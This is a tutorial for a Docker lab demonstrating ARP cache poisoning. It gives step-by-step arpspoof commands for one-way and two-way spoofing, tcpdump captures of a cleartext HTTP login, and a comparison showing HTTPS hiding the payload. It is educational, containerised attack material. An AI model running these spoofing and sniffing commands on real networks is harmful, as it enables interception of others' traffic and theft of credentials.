# ARP Poisoning Lab Using Docker Containers

This lab demonstrates ARP cache poisoning in an isolated Docker bridge network. It shows how a client can be tricked into sending traffic meant for a web server to an attacker container, and how HTTPS reduces the exposure of application data even when ARP spoofing succeeds.

> **Use this only in your own controlled lab environment.** Do not run ARP spoofing tools on networks or systems where you do not have explicit permission.

## Lab Topology

| Component | Container Name | IP Address | Purpose |
|---|---:|---:|---|
| Docker bridge gateway | Docker-managed | `172.30.0.1` | Default gateway for the Docker bridge network |
| HTTP web server | `arp-lab-webapp-http` | `172.30.0.2` | Vulnerable HTTP demo web app on port `3000` |
| Client | `client` | `172.30.0.3` | Sends HTTP/HTTPS requests to the web app |
| Attacker | `attacker` | `172.30.0.4` | Performs ARP spoofing and captures traffic |
| HTTPS web server | `arp-lab-webapp-https` | `172.30.0.5` | Hardened HTTPS demo web app on port `3443` |

### Important Routing Concept

The client and web server are in the same subnet, `172.30.0.0/24`. Therefore, the client does **not** send packets for `172.30.0.2` to the Docker gateway `172.30.0.1`.

For same-subnet traffic, the client directly resolves the web server MAC address using ARP:

```text
Client 172.30.0.3  --->  ARP for 172.30.0.2  --->  Web server 172.30.0.2
```

After ARP spoofing, the client ARP table is poisoned so that:

```text
172.30.0.2 is-at attacker-mac
```

As a result, traffic meant for the web server is sent first to the attacker at Layer 2.

---

## Step 0: Install Docker

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install docker.io -y
sudo usermod -aG docker $USER
```

Log out and log back in to apply Docker group membership.

Verify Docker:

```bash
docker --version
docker ps
```

---

## Step 1: Create the Docker Network

```bash
docker network create \
  --driver bridge \
  --subnet 172.30.0.0/24 \
  --gateway 172.30.0.1 \
  arpnet
```

---

## Step 2: Check the Docker Network

```bash
docker network ls
```

Expected output should include:

```text
NETWORK ID     NAME      DRIVER    SCOPE
xxxxxxxxxxxx   arpnet    bridge    local
```

Inspect the network:

```bash
docker network inspect arpnet
```

Confirm:

```text
Subnet:  172.30.0.0/24
Gateway: 172.30.0.1
```

---

## Step 3: Clone the Repository and Build Images

Install Git if required:

```bash
sudo apt install git -y
```

Clone the repository:

```bash
git clone https://github.com/sumit760/arp-demo.git
cd arp-demo
```

Build the HTTP web application image:

```bash
cd arp-lab-webapp
docker build --no-cache -t arp-lab-webapp:http .
```

Check the image:

```bash
docker images
```

---

## Step 4: Start the HTTP Web Server Container

Start the HTTP demo web app on port `3000`:

```bash
docker run -d \
  --name arp-lab-webapp-http \
  --network arpnet \
  --ip 172.30.0.2 \
  --cap-add NET_ADMIN \
  -p 0.0.0.0:3000:3000 \
  arp-lab-webapp:http
```

Check logs:

```bash
docker logs arp-lab-webapp-http
```

Expected output:

```text
HTTP lab web app running at http://0.0.0.0:3000
```

Log in to the container:

```bash
docker exec -it arp-lab-webapp-http bash
```

Check IP and MAC:

```bash
ip addr
```

Expected IP:

```text
172.30.0.2/24
```

Check route:

```bash
ip route
```

Expected route:

```text
default via 172.30.0.1 dev eth0
172.30.0.0/24 dev eth0 scope link src 172.30.0.2
```

---

## Step 5: Start the Client Container

```bash
docker run -dit \
  --name client \
  --network arpnet \
  --ip 172.30.0.3 \
  --cap-add NET_ADMIN \
  ubuntu:22.04 bash
```

Install basic tools inside the client:

```bash
docker exec client bash -c "apt update && apt install -y iproute2 iputils-ping curl net-tools tcpdump"
```

Log in to the client:

```bash
docker exec -it client bash
```

Check IP:

```bash
ip addr
```

Expected IP:

```text
172.30.0.3/24
```

Check route:

```bash
ip route
```

Expected route:

```text
default via 172.30.0.1 dev eth0
172.30.0.0/24 dev eth0 proto kernel scope link src 172.30.0.3
```

---

## Step 6: Create the ARP Monitoring Script

Copy the file `check-arp.sh` on the Docker host:

Copy it to the client:

```bash
docker cp check-arp.sh client:/check-arp.sh
docker exec client chmod +x /check-arp.sh
```

Copy it to the web server:

```bash
docker cp check-arp.sh arp-lab-webapp-http:/check-arp.sh
docker exec arp-lab-webapp-http chmod +x /check-arp.sh
```

Check the client ARP table:

```bash
docker exec client /check-arp.sh
```

Example output before poisoning:

```text
Address                  HWtype  HWaddress           Flags Mask            Iface
172.30.0.2               ether   <webserver-mac>     C                     eth0
172.30.0.1               ether   <gateway-mac>       C                     eth0
```

---

## Step 7: Start the Attacker Container

```bash
docker run -dit \
  --name attacker \
  --network arpnet \
  --ip 172.30.0.4 \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  kalilinux/kali-rolling bash
```

Install tools inside the attacker container:

```bash
docker exec attacker bash -c "apt update && apt install -y dsniff tcpdump iproute2 iputils-ping curl net-tools"
```

`dsniff` provides the `arpspoof` command.

Check attacker IP and MAC:

```bash
docker exec attacker ip addr
```

Expected IP:

```text
172.30.0.4/24
```

Check attacker ARP cache:

```bash
docker exec attacker arp -n
```

---

## Step 8: Verify Normal Connectivity

From client to Docker bridge gateway:

```bash
docker exec client ping -c 3 172.30.0.1
```

From client to HTTP web server:

```bash
docker exec client ping -c 3 172.30.0.2
```

Test HTTP request:

```bash
docker exec client curl http://172.30.0.2:3000
```

---

## Step 9: Capture ARP Traffic on the Client

Open a terminal and run:

```bash
docker exec -it client tcpdump -n -e -i eth0 arp
```

Keep this running while performing ARP spoofing.

---

## Step 10: One-Way ARP Spoofing

One-way spoofing poisons only the client ARP cache.

Run this from the attacker container:

```bash
docker exec -it attacker arpspoof -i eth0 -t 172.30.0.3 172.30.0.2
```

Meaning:

```text
Tell client 172.30.0.3 that web server 172.30.0.2 is at the attacker MAC.
```

In the client `tcpdump`, you should see ARP replies similar to:

```text
Reply 172.30.0.2 is-at <attacker-mac>
```

Confirm poisoning inside the client:

```bash
docker exec client /check-arp.sh
```

Expected poisoned ARP entry:

```text
172.30.0.2    ether   <attacker-mac>   C   eth0
```

This means the client sends frames intended for `172.30.0.2` to the attacker MAC.

---

## Step 11: Capture HTTP Traffic on the Attacker

Open another terminal and run:

```bash
docker exec -it attacker tcpdump -n -A -i eth0 tcp port 3000
```

---

## Step 12: Send an HTTP Login Request from the Client

From the client container:

```bash
docker exec client curl -X POST http://172.30.0.2:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=alice&password=Library@123"
```

In the attacker `tcpdump`, the HTTP request body is visible in clear text:

```text
POST /login HTTP/1.1
Host: 172.30.0.2:3000
Content-Type: application/x-www-form-urlencoded

username=alice&password=Library@123
```

This demonstrates the risk of sending credentials over HTTP during a successful MITM position.

---

## Step 13: Two-Way ARP Spoofing

Two-way spoofing poisons both the client and the web server.

Open two attacker terminals.

Terminal 1:

```bash
docker exec -it attacker arpspoof -i eth0 -t 172.30.0.3 172.30.0.2
```

Terminal 2:

```bash
docker exec -it attacker arpspoof -i eth0 -t 172.30.0.2 172.30.0.3
```

Meaning:

```text
Client 172.30.0.3 thinks web server 172.30.0.2 is at attacker MAC.
Web server 172.30.0.2 thinks client 172.30.0.3 is at attacker MAC.
```

Check the web server ARP table:

```bash
docker exec arp-lab-webapp-http /check-arp.sh
```

Expected poisoned entry on web server:

```text
172.30.0.3    ether   <attacker-mac>   C   eth0
```

Now the attacker can observe both request and response traffic.

---

## Step 14: Enable HTTPS Web Server

Create a certificate directory inside the HTTPS application folder:

```bash
cd arp-demo/arp-lab-webapp-hardened
mkdir -p certs
```

Create a self-signed certificate for the HTTPS lab server:

```bash
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout certs/server.key \
  -out certs/server.crt \
  -days 365 \
  -subj "/CN=172.30.0.5" \
  -addext "subjectAltName=IP:172.30.0.5"
```

Build the HTTPS image:

```bash
docker build --no-cache -t arp-lab-webapp:https .
```

Run the HTTPS web server:

```bash
docker run -d \
  --name arp-lab-webapp-https \
  --network arpnet \
  --ip 172.30.0.5 \
  --cap-add NET_ADMIN \
  -p 0.0.0.0:3443:3443 \
  arp-lab-webapp:https
```

Check logs:

```bash
docker logs arp-lab-webapp-https
```

Expected output:

```text
HTTPS lab web app running at https://0.0.0.0:3443
```

Copy the ARP script to the HTTPS server:

```bash
docker cp check-arp.sh arp-lab-webapp-https:/check-arp.sh
docker exec arp-lab-webapp-https chmod +x /check-arp.sh
```

---

## Step 15: Two-Way Spoofing Against HTTPS Web Server

Open two attacker terminals.

Terminal 1:

```bash
docker exec -it attacker arpspoof -i eth0 -t 172.30.0.3 172.30.0.5
```

Terminal 2:

```bash
docker exec -it attacker arpspoof -i eth0 -t 172.30.0.5 172.30.0.3
```

Meaning:

```text
Client 172.30.0.3 thinks HTTPS web server 172.30.0.5 is at attacker MAC.
HTTPS web server 172.30.0.5 thinks client 172.30.0.3 is at attacker MAC.
```

---

## Step 16: Send an HTTPS Request from the Client

Start packet capture on the attacker:

```bash
docker exec -it attacker tcpdump -n -A -i eth0 tcp port 3443
```

From the client:

```bash
docker exec client curl -k -X POST https://172.30.0.5:3443/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=alice&password=Library@123"
```

Because HTTPS encrypts the application payload, the attacker can still see metadata such as:

```text
Source IP:      172.30.0.3
Destination IP: 172.30.0.5
Destination port: 3443
TCP handshake and TLS packets
```

However, the attacker should **not** see the clear-text HTTP request body:

```text
username=alice&password=Library@123
```

This demonstrates that HTTPS protects the confidentiality of application-layer data even if ARP cache poisoning succeeds.

---

## One-Way vs Two-Way Spoofing Summary

| Type | Poisoned ARP Cache | Traffic Observed by Attacker |
|---|---|---|
| One-way spoofing | Client only | Mainly client-to-server traffic |
| Two-way spoofing | Client and server | Both request and response traffic |

---

## HTTP vs HTTPS Observation

| Protocol | ARP Spoofing Result | Attacker Visibility |
|---|---|---|
| HTTP | Traffic can be intercepted | Credentials and request data are visible in clear text |
| HTTPS | Traffic can still pass through attacker | Payload is encrypted and not readable without breaking TLS |

---

## Cleanup

Stop and remove containers:

```bash
docker rm -f arp-lab-webapp-http arp-lab-webapp-https client attacker
```

Remove the Docker network:

```bash
docker network rm arpnet
```

---

## Key Learning Outcome

ARP poisoning manipulates IP-to-MAC address mappings inside a local Layer-2 network. In this lab, the attacker changes the client's ARP entry for the web server so that traffic meant for the web server is delivered to the attacker first.

The HTTP test shows that clear-text credentials can be captured during MITM. The HTTPS test shows that even when ARP spoofing succeeds, encrypted application data remains protected from simple packet inspection.

